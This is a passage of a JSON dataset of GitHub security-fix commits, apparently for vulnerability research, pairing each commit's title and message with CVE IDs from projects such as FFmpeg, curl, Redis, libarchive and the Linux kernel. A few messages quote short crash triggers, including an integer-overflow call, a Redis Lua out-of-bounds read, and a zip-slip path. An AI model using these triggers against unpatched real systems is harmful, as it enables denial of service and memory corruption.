    "url": "https://github.com/FFmpeg/FFmpeg/commit/e1b60aad77c27ed5d4dfc11e5e6a05a38c70489d",
    "title": "avcodec/cdxl: Check format parameter",
    "body": "Fixes out of array accessFixes: 1378/clusterfuzz-testcase-minimized-5715088008806400Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9996"
    ],
    "cveIdsCount": 1
  },
  "8044c76305f84afa5f5f19c439c22241171c7ae5dc030358acaa80e471f15405": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/1e42736b95065c69a7481d0cf55247024f54b660",
    "title": "avcodec/cdxl: Check format for BGR24",
    "body": "Fixes: out of array accessFixes: 1427/clusterfuzz-testcase-minimized-5020737339392000Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpegSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-9996"
    ],
    "cveIdsCount": 1
  },
  "f459523edd6df2cea5207cc21d79ffbf60f7d8f6e4a7594a5c7ab82269aff16c": {
    "url": "https://github.com/OpenNMS/opennms/commit/8710463077c10034fcfa06556a98fb1a1a64fd0d",
    "title": "NMS-9065: Fixed the Asset pages JSPs to handle ACL filtering for rele…",
    "body": "…ase-19.0.0",
    "cveIds": [
      "CVE-2018-0046"
    ],
    "cveIdsCount": 1
  },
  "690eb93a9561acfb4f4d977e28bf4b4391fc9674e28409419cc6a309d04e4f8f": {
    "url": "https://github.com/cisco/thor/commit/18de8f9f0762c3a542b1122589edb8af859d9813",
    "title": "Fix possible stack overflows in decoder for illegal bit streams",
    "body": "Fixes CVE-2018-0429A vulnerability in the Thor decoder (available at:https://github.com/cisco/thor) could allow an authenticated, localattacker to cause segmentation faults and stack overflows when using anon-conformant Thor bitstream as input.The vulnerability is due to lack of input validation when parsing thebitstream. A successful exploit could allow the attacker to cause astack overflow and potentially inject and execute arbitrary code.",
    "cveIds": [
      "CVE-2018-0429"
    ],
    "cveIdsCount": 1
  },
  "39893703cb11cbfae5a5d579560a5071e51781c7414afd98bf0bcee24cf0bdde": {
    "url": "https://github.com/curl/curl/commit/ba1dbd78e5f1ed67c1b8d37ac89d90e5e330b628",
    "title": "smtp: use the upload buffer size for scratch buffer malloc",
    "body": "... not the read buffer size, as that can be set smaller and thus causea buffer overflow! CVE-2018-0500Reported-by: Peter WuBug: https://curl.haxx.se/docs/adv_2018-70a2.html",
    "cveIds": [
      "CVE-2018-0500"
    ],
    "cveIdsCount": 1
  },
  "27ebee800f516fee1c68053e24df6431977552a05887f2113b6785fd6de77ae4": {
    "url": "https://github.com/nothings/stb/commit/244d83bc3d859293f55812d48b3db168e581f6ab",
    "title": "fix unchecked length in stb_vorbis that could crash on corrupt/invali…",
    "body": "…d files",
    "cveIds": [
      "CVE-2018-1000050"
    ],
    "cveIdsCount": 1
  },
  "91554418e35b9462fa666cf043d2638644902e12e4a2bd11275a70934b6df8de": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/commit/1e440208a8d8bfd71ad7802e6369a136e8bba3dd",
    "title": "Fixed issue: no CRSF check for uninstall theme, reported by MUSTAFA H…",
    "body": "…ASAN",
    "cveIds": [
      "CVE-2018-1000053"
    ],
    "cveIdsCount": 1
  },
  "e64855ec19d075b12ced8e8abaeaf6fc739ffecf3315cee274147a36fc84b558": {
    "url": "https://github.com/Bitmessage/PyBitmessage/commit/3a8016d31f517775d226aa8b902480f4a3a148a9#comments",
    "title": "Fix message encoding bug",
    "body": "- prevent loading invalid message types",
    "cveIds": [
      "CVE-2018-1000070"
    ],
    "cveIdsCount": 1
  },
  "f079bb9e82f18e3a04dc9f0e3bad4cc1b664c1eb88d7ef2e8e0436a1f5146386": {
    "url": "https://github.com/rubygems/rubygems/commit/666ef793cad42eed96f7aee1cdf77865db921099",
    "title": "Implement a safe mkdir for package that verifies were inside the dest…",
    "body": "…ination dir for all new directories ccreated",
    "cveIds": [
      "CVE-2018-1000079"
    ],
    "cveIdsCount": 1
  },
  "89e621f25fa926307556b7b887c529160a98660eca5200548a2ab67ebe2e9a45": {
    "url": "https://github.com/memcached/memcached/commit/a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00",
    "title": "Don't overflow item refcount on get",
    "body": "Counts as a miss if the refcount is too high. ASCII multigets are the onlytime refcounts can be held for so long.doing a dirty read of refcount. is aligned.trying to avoid adding an extra refcount branch for all calls of item_get dueto performance. might be able to move it in there after logging refactoringsimplifies some of the branches.",
    "cveIds": [
      "CVE-2018-1000127"
    ],
    "cveIdsCount": 1
  },
  "f6c2cb4cb90a2490774f61fcb3f3b407b013b2233a4f0af4dcd76fe9bb980982": {
    "url": "https://github.com/rhuss/jolokia/commit/5895d5c137c335e6b473e9dcb9baf748851bbc5f#diff-f19898247eddb55de6400489bff748ad",
    "title": "fix: Verify a given 'mimeType' and/or 'callback' request parameter",
    "body": "So that only fixed values are possible, in order to avoid XSS attackvectors.",
    "cveIds": [
      "CVE-2018-1000129"
    ],
    "cveIdsCount": 1
  },
  "a4f56f5363a08de9424b89bc0f5f652381e33adc197cf77b1a11f081d33edfad": {
    "url": "https://github.com/fatcerberus/minisphere/commit/252c1ca184cb38e1acb917aa0e451c5f08519996",
    "title": "Fix integer overflow in layer_resize in map_engine.c (#268)",
    "body": "* Fix integer overflow in layer_resize in map_engine.cThere's a buffer overflow bug in the function layer_resize. It allocatesa buffer `tilemap` with size `x_size * y_size * sizeof(struct map_tile)`.But it didn't check for integer overflow, so if x_size and y_size arevery large, it's possible that the buffer size is smaller than needed,causing a buffer overflow later.PoC: `SetLayerSize(0, 0x7FFFFFFF, 0x7FFFFFFF);`* move malloc to a separate line",
    "cveIds": [
      "CVE-2018-1000524"
    ],
    "cveIdsCount": 1
  },
  "fc1f0c4b8a3190300af14db2bbe6c198179ea0dd3834c84baac2404d4b54a7a7": {
    "url": "https://github.com/gosa-project/gosa-core/commit/56070d6289d47ba3f5918885954dcceb75606001",
    "title": "(see #14)",
    "body": "escape html entities for uid to avoid code execution",
    "cveIds": [
      "CVE-2018-1000528"
    ],
    "cveIdsCount": 1
  },
  "cb7979cc0268b1cbc8696932f319e4167b4a2488b5daff8c6584873ed3d8e2e7": {
    "url": "https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322",
    "title": "Fixed RCE in git grep.",
    "body": "A specific option in git grep could be added inside thepattern to be searched for, resulting in possible RCE.Thanks to Kacper Szurek (https://security.szurek.pl) forcatching this one!",
    "cveIds": [
      "CVE-2018-1000533"
    ],
    "cveIdsCount": 1
  },
  "a1a5a31ee899cfe402053386e72d2e0548aadea7b53f93eb25b49584085cc92f": {
    "url": "https://github.com/qutebrowser/qutebrowser/commit/5a7869f2feaa346853d2a85413d6527c87ef0d9f",
    "title": "Fix XSS issue on qute://history",
    "body": "Fixes #4011",
    "cveIds": [
      "CVE-2018-1000559"
    ],
    "cveIdsCount": 1
  },
  "be3add51435390b38ef27d5fd573349413d0e3b1df0a29595452c7045af56a22": {
    "url": "https://github.com/qutebrowser/qutebrowser/commit/4c9360237f186681b1e3f2a0f30c45161cf405c7",
    "title": "Fix XSS issue on qute://history",
    "body": "Fixes #4011(cherry picked from commit 5a7869f)",
    "cveIds": [
      "CVE-2018-1000559"
    ],
    "cveIdsCount": 1
  },
  "38622da887558caae6a628d11414735f8cf1e99f3f4eb8459340d0be0529c412": {
    "url": "https://github.com/rust-lang/rust/commit/f71b37bc28326e272a37b938e835d4f99113eec2",
    "title": "Auto merge of #44802 - sfackler:vecdeque-oob, r=Gankro",
    "body": "Fix capacity comparison in reserveYou can otherwise end up in a situation where you don't actually resizebut still call into handle_cap_increase which then corrupts head/tail.Closes #44800Not totally sure the right way to write a test for this - there are some debug asserts the old bad behavior will hit but we don't build the stdlib with debug assertions by default.r? @gankro",
    "cveIds": [
      "CVE-2018-1000657"
    ],
    "cveIdsCount": 1
  },
  "b2cb188ec1b142cc243771390efe2016ade06d3a6b4a71657b0343c85c5f61bb": {
    "url": "https://github.com/LimeSurvey/LimeSurvey/commit/72a02ebaaf95a80e26127ee7ee2b123cccce05a7",
    "title": "[security] fixed issue #13959: RCE via resource file upload as authen…",
    "body": "…ticated user",
    "cveIds": [
      "CVE-2018-1000659"
    ],
    "cveIdsCount": 1
  },
  "4979d3919da8e493895eeb626c08a85840279bbec2b6a1b8250914f1f9695fb2": {
    "url": "https://github.com/brave/muon/commit/c18663aa171c6cdf03da3e8c70df8663645b97c4",
    "title": "Issue: 15232 AllowScript should use atom::ContentSettingsManager like…",
    "body": "… other Allow* methods in the observer",
    "cveIds": [
      "CVE-2018-1000815"
    ],
    "cveIdsCount": 1
  },
  "99ebe2dd1f22facd77ec688def83b303dff29e00c48caa3775d6343f3baf1863": {
    "url": "https://github.com/funzoneq/freshdns/pull/6/commits/bdeff81bd4baff9463d46b90fb1889e7ac7ec4ed",
    "title": "security: add protection against XSRF (Cross Site Request Forgery) on…",
    "body": "… all POST requests",
    "cveIds": [
      "CVE-2018-1000846"
    ],
    "cveIdsCount": 1
  },
  "56aa052583735514bd418a192457e64d0790afba02a5735e579362b292e6f3d3": {
    "url": "https://github.com/libarchive/libarchive/pull/1105/commits/bfcfe6f04ed20db2504db8a254d1f40a1d84eb28",
    "title": "rar: file split across multi-part archives must match",
    "body": "Fuzzing uncovered some UAF and memory overrun bugs where a file in asingle file archive reported that it was split across multiplevolumes. This was caused by ppmd7 operations callingrar_br_fillup. This would invoke rar_read_ahead, which would in somesituations invoke archive_read_format_rar_read_header. That wouldcheck the new file name against the old file name, and if they didn'tmatch up it would free the ppmd7 buffer and allocate a newone. However, because the ppmd7 decoder wasn't actually done with thebuffer, it would continue to used the freed buffer. Both reads andwrites to the freed region can be observed.This is quite tricky to solve: once the buffer has been freed it istoo late, as the ppmd7 decoder functions almost universally assumesuccess - there's no way for ppmd_read to signal error, nor are theregood ways for functions like Range_Normalise to propagate them. So wecan't detect after the fact that we're in an invalid state - e.g. bychecking rar->cursor, we have to prevent ourselves from ever ending upthere. So, when we are in the dangerous part or rar_read_ahead thatassumes a valid split, we set a flag force read_header to either godown the path for split files or bail. This means that the ppmd7decoder keeps a valid buffer and just runs out of data.Found with a combination of AFL, afl-rb and qsym.",
    "cveIds": [
      "CVE-2018-1000878"
    ],
    "cveIdsCount": 1
  },
  "a35626452d568499e4c82ce7a6467272193dba1dee7cbf8fb04ac830c45e650e": {
    "url": "https://github.com/libarchive/libarchive/pull/1105/commits/15bf44fd2c1ad0e3fd87048b3fcc90c4dcff1175",
    "title": "Skip 0-length ACL fields",
    "body": "Currently, it is possible to create an archive that crashes bsdtarwith a malformed ACL:Program received signal SIGSEGV, Segmentation fault.archive_acl_from_text_l (acl=<optimised out>, text=0x7e2e92 \"\", want_type=<optimised out>, sc=<optimised out>) at libarchive/archive_acl.c:17261726switch (*s) {(gdb) p n$1 = 1(gdb) p field[n]$2 = {start = 0x0, end = 0x0}Stop this by checking that the length is not zero before beginningthe switch statement.I am pretty sure this is the bug mentioned in the qsym paper [1],and I was able to replicate it with a qsym + AFL + afl-rb setup.[1] https://www.usenix.org/conference/usenixsecurity18/presentation/yun",
    "cveIds": [
      "CVE-2018-1000879"
    ],
    "cveIdsCount": 1
  },
  "6d65ab7d42816e62ebcf60b0514f4e032f6b75060c2bba4d9c5a89e6aa4b11a7": {
    "url": "https://github.com/libarchive/libarchive/pull/1105/commits/9c84b7426660c09c18cc349f6d70b5f8168b5680",
    "title": "warc: consume data once read",
    "body": "The warc decoder only used read ahead, it wouldn't actually consumedata that had previously been printed. This means that if you specifyan invalid content length, it will just reprint the same data overand over and over again until it hits the desired length.This means that a WARC resource with e.g.Content-Length: 666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666665but only a few hundred bytes of data, causes a quasi-infinite loop.Consume data in subsequent calls to _warc_read.Found with an AFL + afl-rb + qsym setup.",
    "cveIds": [
      "CVE-2018-1000880"
    ],
    "cveIdsCount": 1
  },
  "0238214b3b8304bc2b8b5fec0826f5edb16acdb3425593af00a2fbf26242ef50": {
    "url": "https://github.com/OpenMPT/openmpt/commit/7ebf02af2e90f03e0dbd0e18b8b3164f372fb97c",
    "title": "[Fix] Possible out-of-bounds read when computing length of some IT fi…",
    "body": "…les with pattern loops (OpenMPT: formats that are converted to IT, libopenmpt: IT/ITP/MO3), caught with afl-fuzz.git-svn-id: https://source.openmpt.org/svn/openmpt/trunk/OpenMPT@10027 56274372-70c3-4bfc-bfc3-4c3a0b034d27",
    "cveIds": [
      "CVE-2018-10017"
    ],
    "cveIdsCount": 1
  },
  "d5718d48bd43f154a06b0626b9f71daacf16fb8aa0e788c3e0fdd15e788c5985": {
    "url": "https://github.com/codehaus-plexus/plexus-archiver/commit/f8f4233508193b70df33759ae9dc6154d69c2ea8",
    "title": "Merge pull request #87 from odinn1984/fix/fail_on_outside_target_files",
    "body": "fix: fail when trying to extract outside of dest dir",
    "cveIds": [
      "CVE-2018-1002200"
    ],
    "cveIdsCount": 1
  },
  "1e059f093079b9cff09d52762a593c9db6e27efce9ff912772b08e1813c351ec": {
    "url": "https://github.com/zeroturnaround/zt-zip/commit/759b72f33bc8f4d69f84f09fcb7f010ad45d6fff",
    "title": "Fixed potential security vulnerability reported by Snyk Security Rese…",
    "body": "…arch TeamThis is an arbitrary file write vulnerability, that can be achieved using a specially crafted zip archive, that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder.",
    "cveIds": [
      "CVE-2018-1002201"
    ],
    "cveIdsCount": 1
  },
  "cac63929c2ff2ef4ae1d98d5e80675597550cc7e3763879fe251bf949db577d9": {
    "url": "https://github.com/ZJONSSON/node-unzipper/commit/2220ddd5b58f6252069a4f99f9475441ad0b50cd",
    "title": "Merge pull request #59 from aviadatsnyk/fix/zip-slip",
    "body": "fix: prevent extracting archived files outside of target path",
    "cveIds": [
      "CVE-2018-1002203"
    ],
    "cveIdsCount": 1
  },
  "aa7fa12df900a817a5300615601a54b703e4704c9bd1f49dec9d2f3363334140": {
    "url": "https://github.com/cthackers/adm-zip/commit/62f64004fefb894c523a7143e8a88ebe6c84df25",
    "title": "Merge pull request #212 from aviadatsnyk/master",
    "body": "fix: prevent extracting archived files outside of target path. Credit to Snyk Security Research Team for disclosure and fixing the issue.",
    "cveIds": [
      "CVE-2018-1002204"
    ],
    "cveIdsCount": 1
  },
  "a8cbea825043c9ab1b942ee78e1eb02ddfd83feff32db348e340318c4db0e19e": {
    "url": "https://github.com/haf/DotNetZip.Semverd/commit/55d2c13c0cc64654e18fcdd0038fdb3d7458e366",
    "title": "Merge pull request #121 from shana/bugs/relative-paths",
    "body": "Sanitize zip entry paths before extracting",
    "cveIds": [
      "CVE-2018-1002205"
    ],
    "cveIdsCount": 1
  },
  "070801dd0bec65425cb9758a39c20a02061598087eea9279d925b664075b91ec": {
    "url": "https://github.com/adamhathcock/sharpcompress/commit/42b1205fb435de523e6ef8ac5b7bafbe712997f6",
    "title": "Merge pull request #374 from odinn1984/feat/fail_on_outside_target_files",
    "body": "fix: prevent extracting archived files outside of target path",
    "cveIds": [
      "CVE-2018-1002206"
    ],
    "cveIdsCount": 1
  },
  "cb5a5bd71b20c10cdb274eb4e241b1f12bc51c0a3d7eca4adef5116101a8cd14": {
    "url": "https://github.com/mholt/archiver/commit/e4ef56d48eb029648b0e895bb0b6a393ef0829c3",
    "title": "fix: prevent extraction of archived files outside target path (#65)",
    "body": "* fix: prevent extraction of archived files outside target path* CR: consolidate the path sanitaiton logic",
    "cveIds": [
      "CVE-2018-1002207"
    ],
    "cveIdsCount": 1
  },
  "d9a1cce005b5a99206d4d6c096af8613aae5e5198d1315e6f0c861b654dee684": {
    "url": "https://github.com/stachenov/quazip/commit/5d2fc16a1976e5bf78d2927b012f67a2ae047a98",
    "title": "Fixed the Zip Slip vulnerability in JlCompress",
    "body": "When extracting a file with a dangerous path like \"../evil.exe\"from a ZIP archive with JlCompress::extractDir(), the targetfile would be created outside of the target directory, potentiallyeven overwriting an existing file there.",
    "cveIds": [
      "CVE-2018-1002209"
    ],
    "cveIdsCount": 1
  },
  "29adaa5da77371bfc847074a95a6447c5d4898b9d2ab8cbbcf2b8e6908b592f3": {
    "url": "https://github.com/bigtreecms/BigTree-CMS/commit/b2eff67e45b90ca26a62e971e8f0d5d0d70f23e6",
    "title": "Fixing XSS injection via user profile editing -- thanks zhzzhz:",
    "body": "#332",
    "cveIds": [
      "CVE-2018-10364"
    ],
    "cveIdsCount": 1
  },
  "2ec2d03f1cd47220f75edccda46aecf5bbc0d840a072679e1b30f97491d3b3a7": {
    "url": "https://github.com/bigtreecms/BigTree-CMS/commit/609bd17728ee1db0487a42d96028d30537528ae8",
    "title": "Rejecting htaccess files:",
    "body": "#335",
    "cveIds": [
      "CVE-2018-10574"
    ],
    "cveIdsCount": 1
  },
  "c6f08015eacf08c2c453601171da44060800c33a66fa708f8937ffd832802c87": {
    "url": "https://github.com/torvalds/linux/commit/57ebd808a97d7c5b1e1afb937c2db22beba3c1f8",
    "title": "netfilter: add back stackpointer size checks",
    "body": "The rationale for removing the check is only correct for rulesetsgenerated by ip(6)tables.In iptables, a jump can only occur to a user-defined chain, i.e.because we size the stack based on number of user-defined chains wecannot exceed stack size.However, the underlying binary format has no such restriction,and the validation step only ensures that the jump target is avalid rule start point.IOW, its possible to build a rule blob that has no user-definedchains but does contain a jump.If this happens, no jump stack gets allocated and crash occursbecause no jumpstack was allocated.Fixes: 7814b6e (\"netfilter: xtables: don't save/restore jumpstack offset\")Reported-by: syzbot+e783f671527912cd9403@syzkaller.appspotmail.comSigned-off-by: Florian Westphal <fw@strlen.de>Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>",
    "cveIds": [
      "CVE-2018-1065"
    ],
    "cveIdsCount": 1
  },
  "eca522289b0164f880a4d24e5da0ffb437fe4b22f9debc2f6a6cb434ac0d8f7e": {
    "url": "https://github.com/matrix-org/synapse/commit/33f469ba19586bbafa0cf2c7d7c35463bdab87eb",
    "title": "Apply some limits to depth to counter abuse",
    "body": "* When creating a new event, cap its depth to 2^63 - 1* When receiving events, reject any without a sensible depthAs per https://docs.google.com/document/d/1I3fi2S-XnpO45qrpCsowZv8P8dHcNZ4fsBsbOW7KABI",
    "cveIds": [
      "CVE-2018-10657"
    ],
    "cveIdsCount": 1
  },
  "237b5da80fc07484c6abd1721e6e6086fc9168cd71e3d0f1588e69c491d4386e": {
    "url": "https://github.com/torvalds/linux/commit/cabfb3680f78981d26c078a26e5c748531257ebb",
    "title": "CIFS: Enable encryption during session setup phase",
    "body": "In order to allow encryption on SMB connection we need to exchangea session key and generate encryption and decryption keys.Signed-off-by: Pavel Shilovsky <pshilov@microsoft.com>",
    "cveIds": [
      "CVE-2018-1066"
    ],
    "cveIdsCount": 1
  },
  "e3c47d36f6d4adadb291d31c69991722534228c1466968bedae2b1f5afa1633b": {
    "url": "https://github.com/torvalds/linux/commit/73223e4e2e3867ebf033a5a8eb2e5df0158ccc99",
    "title": "mm/mempolicy: fix use after free when calling get_mempolicy",
    "body": "I hit a use after free issue when executing trinity and repoduced itwith KASAN enabled. The related call trace is as follows. BUG: KASan: use after free in SyS_get_mempolicy+0x3c8/0x960 at addr ffff8801f582d766 Read of size 2 by task syz-executor1/798 INFO: Allocated in mpol_new.part.2+0x74/0x160 age=3 cpu=1 pid=799 __slab_alloc+0x768/0x970 kmem_cache_alloc+0x2e7/0x450 mpol_new.part.2+0x74/0x160 mpol_new+0x66/0x80 SyS_mbind+0x267/0x9f0 system_call_fastpath+0x16/0x1b INFO: Freed in __mpol_put+0x2b/0x40 age=4 cpu=1 pid=799 __slab_free+0x495/0x8e0 kmem_cache_free+0x2f3/0x4c0 __mpol_put+0x2b/0x40 SyS_mbind+0x383/0x9f0 system_call_fastpath+0x16/0x1b INFO: Slab 0xffffea0009cb8dc0 objects=23 used=8 fp=0xffff8801f582de40 flags=0x200000000004080 INFO: Object 0xffff8801f582d760 @offset=5984 fp=0xffff8801f582d600 Bytes b4 ffff8801f582d750: ae 01 ff ff 00 00 00 00 5a 5a 5a 5a 5a 5a 5a 5a ........ZZZZZZZZ Object ffff8801f582d760: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b kkkkkkkkkkkkkkkk Object ffff8801f582d770: 6b 6b 6b 6b 6b 6b 6b a5 kkkkkkk. Redzone ffff8801f582d778: bb bb bb bb bb bb bb bb ........ Padding ffff8801f582d8b8: 5a 5a 5a 5a 5a 5a 5a 5a ZZZZZZZZ Memory state around the buggy address: ffff8801f582d600: fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc fc ffff8801f582d680: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc >ffff8801f582d700: fc fc fc fc fc fc fc fc fc fc fc fc fb fb fb fc!shared memory policy is not protected against parallel removal by otherthread which is normally protected by the mmap_sem. do_get_mempolicy,however, drops the lock midway while we can still access it later.Early premature up_read is a historical artifact from times whenput_user was called in this path see https://lwn.net/Articles/124754/but that is gone since 8bccd85 (\"[PATCH] Implement sys_* do_*layering in the memory policy layer.\"). but when we have the thecurrent mempolicy ref count model. The issue was introducedaccordingly.Fix the issue by removing the premature release.Link: http://lkml.kernel.org/r/1502950924-27521-1-git-send-email-zhongjiang@huawei.comSigned-off-by: zhong jiang <zhongjiang@huawei.com>Acked-by: Michal Hocko <mhocko@suse.com>Cc: Minchan Kim <minchan@kernel.org>Cc: Vlastimil Babka <vbabka@suse.cz>Cc: David Rientjes <rientjes@google.com>Cc: Mel Gorman <mgorman@techsingularity.net>Cc: <stable@vger.kernel.org>[2.6+]Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2018-10675"
    ],
    "cveIdsCount": 1
  },
  "2f7fb9fe03ccf0c4f900ad00af3089cbe40d13865370abc9c692f6afb7da3c8f": {
    "url": "https://github.com/miniupnp/ngiflib/commit/b588a2249c7abbfc52173e32ee11d6facef82f89",
    "title": "check GIF image position and dimensions",
    "body": "fixes #1",
    "cveIds": [
      "CVE-2018-10677"
    ],
    "cveIdsCount": 1
  },
  "bc1828514b9fc2d3aaeff58ee8228b3e3e943b220ad7ef9ecdebc741e7f29103": {
    "url": "https://github.com/torvalds/linux/commit/b71812168571fa55e44cdd0254471331b9c4c4c6",
    "title": "netfilter: ebtables: CONFIG_COMPAT: don't trust userland offsets",
    "body": "We need to make sure the offsets are not out of range of thetotal size.Also check that they are in ascending order.The WARN_ON triggered by syzkaller (it sets panic_on_warn) ischanged to also bail out, no point in continuing parsing.Briefly tested with simple ruleset of-A INPUT --limit 1/s' --logplus jump to custom chains using 32bit ebtables binary.Reported-by: <syzbot+845a53d13171abf8bf29@syzkaller.appspotmail.com>Signed-off-by: Florian Westphal <fw@strlen.de>Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>",
    "cveIds": [
      "CVE-2018-1068"
    ],
    "cveIdsCount": 1
  },
  "dcfddede07c435ec7a6b7266164925cbb26f1158eb8344709bea06a0cf10e5c0": {
    "url": "https://github.com/ILIAS-eLearning/ILIAS/commit/d0dcad1b1e729f694acd0582bc626c7c8e62b519",
    "title": "RSS: Some URl manipulations",
    "body": "(cherry picked from commit feaa3d4)",
    "cveIds": [
      "CVE-2018-11118"
    ],
    "cveIdsCount": 1
  },
  "5b5adc90ba33427630a5d2fe0388193714ff164b8b833e7d562c27f2fa556612": {
    "url": "https://github.com/ILIAS-eLearning/ILIAS/commit/6b2217c31b6974788a5c787413454475687b44bb",
    "title": "RSS: Some URl manipulations",
    "body": "(cherry picked from commit 10981b1)",
    "cveIds": [
      "CVE-2018-11118"
    ],
    "cveIdsCount": 1
  },
  "fbb7cbdaea9fef0ed13d545aaf64b1095433c9fa1b6d4643580e56d962c98c19": {
    "url": "https://github.com/antirez/redis/commit/5ccb6f7a791bf3490357b00a898885759d98bab0",
    "title": "Security: more cmsgpack fixes by @soloestoy.",
    "body": "@soloestoy sent me this additional fixes, after searching for similarproblems to the one reported in mp_pack(). I'm committing the changesbecause it was not possible during to make a public PR to protect Redisusers and give Redis providers some time to patch their systems.",
    "cveIds": [
      "CVE-2018-11218"
    ],
    "cveIdsCount": 1
  },
  "39f8d5e1d763923dd52daa312231cd7f0a1469d079558098aa390c460677cafb": {
    "url": "https://github.com/antirez/redis/commit/52a00201fca331217c3b4b8b634f6a0f57d6b7d3",
    "title": "Security: fix Lua cmsgpack library stack overflow.",
    "body": "During an auditing effort, the Apple Vulnerability Research team discovereda critical Redis security issue affecting the Lua scripting part of Redis.-- Description of the problemSeveral years ago I merged a pull request including many small changes atthe Lua MsgPack library (that originally I authored myself). The PullRequest entered Redis in commit 90b6337, in 2014.Unfortunately one of the changes included a variadic Lua function thatlacked the check for the available Lua C stack. As a result, calling the\"pack\" MsgPack library function with a large number of arguments, resultsinto pushing into the Lua C stack a number of new values proportional tothe number of arguments the function was called with. The pushed values,moreover, are controlled by untrusted user input.This in turn causes stack smashing which we believe to be exploitable,while not very deterministic, but it is likely that an exploit could becreated targeting specific versions of Redis executables. However at itsminimum the issue results in a DoS, crashing the Redis server.-- Versions affectedVersions greater or equal to Redis 2.8.18 are affected.-- ReproducingReproduce with this (based on the original reproduction script byApple security team):https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a-- Verification of the fixThe fix was tested in the following way:1) I checked that the problem is no longer observable running the trigger.2) The Lua code was analyzed to understand the stack semantics, and thatactually enough stack is allocated in all the cases of mp_pack() calls.3) The mp_pack() function was modified in order to show exactly what itemsin the stack were being set, to make sure that there is no silent overfloweven after the fix.-- CreditsThank you to the Apple team and to the other persons that helped mechecking the patch and coordinating this communication.",
    "cveIds": [
      "CVE-2018-11218"
    ],
    "cveIdsCount": 1
  },
  "fae77e5c1a71b5e0500547581635cf0d30896b0d01aa517bb9c4c3c673dc1bac": {
    "url": "https://github.com/antirez/redis/commit/e89086e09a38cc6713bcd4b9c29abf92cf393936",
    "title": "Security: fix Lua struct package offset handling.",
    "body": "After the first fix to the struct package I found another similarproblem, which is fixed by this patch. It could be reproduced easily byrunning the following script: return struct.unpack('f', \"xxxxxxxxxxxxx\",-3)The above will access bytes before the 'data' pointer.",
    "cveIds": [
      "CVE-2018-11219"
    ],
    "cveIdsCount": 1
  },
  "32e3a3efb7bbad7c07aecdad24db5ad87a61fa20777504b0d02e7a29774eedab": {
    "url": "https://github.com/antirez/redis/commit/1eb08bcd4634ae42ec45e8284923ac048beaa4c3",
    "title": "Security: update Lua struct package for security.",
    "body": "During an auditing Apple found that the \"struct\" Lua packagewe ship with Redis (http://www.inf.puc-rio.br/~roberto/struct/) containsa security problem. A bound-checking statement fails because of integeroverflow. The bug exists since we initially integrated this package withLua, when scripting was introduced, so every version of Redis withEVAL/EVALSHA capabilities exposed is affected.Instead of just fixing the bug, the library was updated to the latestversion shipped by the author.",
    "cveIds": [
      "CVE-2018-11219"
    ],
    "cveIdsCount": 1
  },
  "37f17a10b03cadb8099d0c53f4eb12d56f8899dc3b1ddd97f3c564f60e288706": {
    "url": "https://github.com/torvalds/linux/commit/f09444639099584bc4784dfcd85ada67c6f33e0f",
    "title": "coresight: fix kernel panic caused by invalid CPU",
    "body": "Commit d52c975 (\"coresight: reset \"enable_sink\" flag when need be\")caused a kernel panic because of the using of an invalid value: after'for_each_cpu(cpu, mask)', value of local variable 'cpu' become invalid,causes following 'cpu_to_node' access invalid memory area.This patch brings the deleted 'cpu = cpumask_first(mask)' back.Panic log: $ perf record -e cs_etm// ls Unable to handle kernel paging request at virtual address fffe801804af4f10 pgd = ffff8017ce031600 [fffe801804af4f10] *pgd=0000000000000000, *pud=0000000000000000 Internal error: Oops: 96000004 [#1] SMP Modules linked in: CPU: 33 PID: 1619 Comm: perf Not tainted 4.7.1+ #16 Hardware name: Huawei Taishan 2280 /CH05TEVBA, BIOS 1.10 11/24/2016 task: ffff8017cb0c8400 ti: ffff8017cb154000 task.ti: ffff8017cb154000 PC is at tmc_alloc_etf_buffer+0x60/0xd4 LR is at tmc_alloc_etf_buffer+0x44/0xd4 pc : [<ffff000008633df8>] lr : [<ffff000008633ddc>] pstate: 60000145 sp : ffff8017cb157b40 x29: ffff8017cb157b40 x28: 0000000000000000 ...skip... 7a60: ffff000008c64dc8 0000000000000006 0000000000000253 ffffffffffffffff 7a80: 0000000000000000 0000000000000000 ffff0000080872cc 0000000000000001 [<ffff000008633df8>] tmc_alloc_etf_buffer+0x60/0xd4 [<ffff000008632b9c>] etm_setup_aux+0x1dc/0x1e8 [<ffff00000816eed4>] rb_alloc_aux+0x2b0/0x338 [<ffff00000816a5e4>] perf_mmap+0x414/0x568 [<ffff0000081ab694>] mmap_region+0x324/0x544 [<ffff0000081abbe8>] do_mmap+0x334/0x3e0 [<ffff000008191150>] vm_mmap_pgoff+0xa4/0xc8 [<ffff0000081a9a30>] SyS_mmap_pgoff+0xb0/0x22c [<ffff0000080872e4>] sys_mmap+0x18/0x28 [<ffff0000080843f0>] el0_svc_naked+0x24/0x28 Code: 912040a5 d0001c00 f873d821 911c6000 (b8656822) ---[ end trace 98933da8f92b0c9a ]---Signed-off-by: Wang Nan <wangnan0@huawei.com>Cc: Xia Kaixu <xiakaixu@huawei.com>Cc: Li Zefan <lizefan@huawei.com>Cc: Mathieu Poirier <mathieu.poirier@linaro.org>Cc: linux-arm-kernel@lists.infradead.orgCc: linux-kernel@vger.kernel.orgFixes: d52c975 (\"coresight: reset \"enable_sink\" flag when need be\")Signed-off-by: Mathieu Poirier <mathieu.poirier@linaro.org>Cc: stable 